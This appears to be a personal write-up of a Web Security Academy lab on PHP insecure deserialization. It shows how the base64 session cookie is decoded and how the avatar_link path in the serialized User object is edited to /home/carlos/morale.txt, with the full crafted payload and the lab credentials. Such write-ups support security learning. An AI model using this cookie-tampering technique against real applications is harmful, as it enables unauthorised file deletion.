This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

You also have access to a backup account: `gregg:rosebud`

# Recon

The serialized session cookie is obtained after a successful login

![[serialized-cookie.png]]

# Vuln assessment

The session cookie seems to be an url and base64 encoded PHP object:

![[serialized-object.png]]

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"v1zp5e8nm9xi1uo2wt9ztza9c9ty5r3x";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

The object seems to contain the path to the user's avatar picture.

![[attack-object.png]]

The application also has a functionality to delete the user's account 

![[delete-account-funct.png]]

When setting an avatar it is available in:

```
https://0aef0053037b5d21800385cb0020000a.web-security-academy.net/avatar?avatar=gregg
```

When trying to delete the account setting the path to the image:

```
/home/carlos/morale.txt
```

The following error appears:

![[error-home-carlos.png]]

# Exploitation

Let's try with `users/carlos/morale.txt`

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"jg6n12pmydmgsmyr7t0ngb46aqrwzlo3";s:11:"avatar_link";s:18:"users/carlos/morale.txt";}
```

REMEMBER to update the string length in the serialized object when replacing the string with the target file path:

```
s:23:"/home/carlos/morale.txt"
```

The full attack object is:

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"jg6n12pmydmgsmyr7t0ngb46aqrwzlo3";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

Base64 and URL encode it, replace the session cookie with the result and sending the request will solve the lab.

![[exploited.png]]